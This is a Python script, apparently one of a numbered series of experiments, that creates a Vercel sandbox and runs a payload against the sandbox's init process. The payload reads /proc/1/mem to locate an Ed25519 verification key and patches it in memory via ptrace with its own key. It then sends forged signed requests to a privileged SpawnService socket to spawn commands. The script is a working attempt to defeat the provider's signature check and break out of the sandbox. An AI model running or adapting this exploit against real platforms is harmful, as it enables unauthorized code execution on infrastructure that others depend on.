# 实验J55: 完整段遍历找 pub32 + 定位验证公钥来源 + 工具链检查
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj55"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, base64, subprocess, json, time, ctypes, hashlib

PUB_B64 = "zBO7hUsIkDOrMW4VmKei/v0KlhZflnTw7RAYFeoT5uw="
PUB = base64.b64decode(PUB_B64)

os.makedirs("/tmp/k", exist_ok=True)
os.chdir("/tmp/k")
subprocess.run(["openssl", "genpkey", "-algorithm", "ed25519", "-out", "key.pem"], capture_output=True)
subprocess.run(["openssl", "pkey", "-in", "key.pem", "-pubout", "-out", "pub.pem"], capture_output=True)
MYPUB = subprocess.run(["openssl", "pkey", "-pubin", "-in", "pub.pem", "-outform", "DER"],
                       capture_output=True).stdout
i = MYPUB.rfind(b"\x03\x21\x00")
MYPUB32 = MYPUB[i+3:i+35]
MY_B64 = base64.b64encode(MYPUB32).decode()
print("my pub b64:", MY_B64, flush=True)

print("===== [0] 工具链检查 =====", flush=True)
for tool in ["go", "gdb", "objdump", "readelf", "strings", "perf", "gcore"]:
    r = subprocess.run(["which", tool], capture_output=True, text=True)
    print("%-10s %s" % (tool, r.stdout.strip() or "NOT FOUND"), flush=True)
try:
    r = subprocess.run(["go", "version"], capture_output=True, text=True, timeout=10)
    print("go version:", r.stdout.strip() or r.stderr.strip(), flush=True)
except Exception as e:
    print("go version err:", e, flush=True)
# 检查系统里有哪些可用工具
r = subprocess.run(["ls", "/usr/bin"], capture_output=True, text=True)
avail = [x for x in r.stdout.split() if any(k in x for k in ["obj", "read", "nm", "hex", "od", "dd"])]
print("binutils-like:", avail, flush=True)

print("===== [1] 完整段遍历扫描 (不截断) =====", flush=True)
def mem_scan_full(patterns, max_seg=1 << 30, chunk=8*1024*1024):
    fd = os.open("/proc/1/mem", os.O_RDONLY)
    maps = open("/proc/1/maps").read()
    results = {k: [] for k in patterns}
    total = 0
    for line in maps.splitlines():
        p = line.split()
        if len(p) < 2 or "r" not in p[1]:
            continue
        addr = p[0].split("-")
        start, end = int(addr[0], 16), int(addr[1], 16)
        if end - start > max_seg:
            print("skip big seg %s-%s %s" % (p[0], p[1], p[5] if len(p) > 5 else ""), flush=True)
            continue
        pa = p[5] if len(p) > 5 else ""
        if pa in ("[vsyscall]", "[vvar]", "[vvar_vclock]", "[vdso]"):
            continue
        cur = start
        while cur < end:
            n = min(chunk, end - cur)
            try:
                os.lseek(fd, cur, os.SEEK_SET)
                data = os.read(fd, n)
            except Exception:
                break
            total += len(data)
            for k, pat in patterns.items():
                idx = 0
                while True:
                    j = data.find(pat, idx)
                    if j < 0:
                        break
                    results[k].append((cur + j, pa))
                    idx = j + 1
                    if len(results[k]) > 20:
                        break
            cur += n
    os.close(fd)
    return results, total

patterns = {
    "pub32": PUB,
    "pub-b64": PUB_B64.encode(),
    "invalid signature": b"invalid signature",
    "missing signature": b"missing signature header",
    "ed25519.Verify": b"ed25519.Verify",
}
res, total = mem_scan_full(patterns)
print("scanned bytes: %d" % total, flush=True)
for k in ("pub32", "pub-b64"):
    print("%s hits: %d" % (k, len(res[k])), flush=True)
    for a, pa in res[k][:20]:
        print("   %s %s" % (hex(a), pa), flush=True)

print("===== [2] 替换 pub-b64 为垃圾串, 观察验证行为 =====", flush=True)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long
libc.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
libc.waitpid.restype = ctypes.c_int

def ptrace_write(addr, data):
    libc.ptrace(16, 1, None, None)
    libc.waitpid(1, None, 0)
    PTRACE_POKEDATA = 5
    ok = 0
    total_w = (len(data) + 7) // 8
    for off in range(0, len(data), 8):
        word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
        r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
        if r == 0:
            ok += 1
    libc.ptrace(17, 1, None, None)
    return ok, total_w

def ccall(path, body, hdrs, timeout=8):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: application/connect+json",
           "-H", "Connect-Protocol-Version: 1"]
    for k, v in hdrs.items():
        cmd += ["-H", "%s: %s" % (k, v)]
    cmd += ["-d", body, "http://localhost" + path]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return r.stdout
    except Exception as e:
        return "EXC " + str(e)

# 先确认替换前的行为: 正确格式的请求返回 invalid signature
ts = str(int(time.time() * 1000))
out = ccall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", '{"command":"id"}',
            {"x-timestamp": ts, "x-signature": "A" * 88})
m = re.search(r'\{"error".*?\}', out)
print("baseline with garbage sig:", m.group(0) if m else out[-200:], flush=True)

# 把 7 份 base64 改成无效串
GARBAGE = "!!!!INVALID_BASE64!!!!"
for h in res["pub-b64"]:
    ok, tw = ptrace_write(h, GARBAGE.encode()[:len(PUB_B64.encode())].ljust(len(PUB_B64.encode()), b"X"))
    print("garbage-write %s: %d/%d" % (hex(h), ok, tw), flush=True)

out = ccall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", '{"command":"id"}',
            {"x-timestamp": ts, "x-signature": "A" * 88})
m = re.search(r'\{"error".*?\}', out)
print("after garbage b64:", m.group(0) if m else out[-300:], flush=True)

print("===== [3] 尝试更多签名消息格式 (ts 秒/毫秒/ISO) =====", flush=True)
def sign(msg: bytes):
    with open("/tmp/k/msg.bin", "wb") as f:
        f.write(msg)
    r = subprocess.run(["openssl", "pkeyutl", "-sign", "-inkey", "/tmp/k/key.pem",
                        "-rawin", "-in", "/tmp/k/msg.bin", "-out", "/tmp/k/sig.bin"],
                       capture_output=True)
    if r.returncode != 0:
        return None
    return open("/tmp/k/sig.bin", "rb").read()

# 先恢复 pub-b64 为我们的 (万一验证用字符串)
for h in res["pub-b64"]:
    ptrace_write(h, MY_B64.encode().ljust(len(PUB_B64.encode()), b"="))

import datetime
body_j = '{"command":"id"}'
ts_ms = str(int(time.time() * 1000))
ts_s = str(int(time.time()))
ts_iso = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
formats = {
    "ms": lambda t: t.encode(),
    "ms+body": lambda t: (t + body_j).encode(),
    "body+ms": lambda t: (body_j + t).encode(),
    "ms+sep+body": lambda t: (t + "|" + body_j).encode(),
    "s": lambda t: t.encode(),
    "s+body": lambda t: (t + body_j).encode(),
    "body+s": lambda t: (body_j + t).encode(),
    "iso": lambda t: t.encode(),
    "iso+body": lambda t: (t + body_j).encode(),
}
for tname, tv in [("ms", ts_ms), ("s", ts_s), ("iso", ts_iso)]:
    for name, fn in formats.items():
        if not name.startswith(tname) and not name.endswith(tname):
            continue
        if name.split("+")[0] != tname and name.split("+")[-1] != tname and name not in (tname,):
            continue
        msg = fn(tv)
        sig = sign(msg)
        if sig is None:
            continue
        out = ccall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", body_j,
                    {"x-timestamp": tv, "x-signature": base64.b64encode(sig).decode()})
        m = re.search(r'\{"error".*?\}', out)
        st = m.group(0) if m else ("NON-ERROR " + out[-300:])
        print("%-12s -> %s" % (name, st), flush=True)
'''
run_cmd(sid, SCAN, "full-scan-pubkey-locate", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
